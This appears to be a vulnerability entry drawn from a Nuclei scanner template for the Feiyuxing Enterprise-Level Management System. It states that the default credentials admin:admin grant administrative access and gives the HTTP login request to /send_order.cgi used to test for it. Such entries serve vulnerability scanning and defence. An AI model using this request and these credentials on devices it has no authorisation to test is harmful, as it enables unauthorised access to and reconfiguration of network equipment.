# Vulnerability: Feiyuxing Enterprise-Level Management System - Default Login
**Classification:** FEIYUXING
**Source:** Nuclei Template (`feiyuxing-default-login.yaml`)

## Description
Attackers can log in through admin:admin, check the system status, and configure the device.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /send_order.cgi?parameter=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

{"username":"{{username}}","password":"{{password}}"}
```

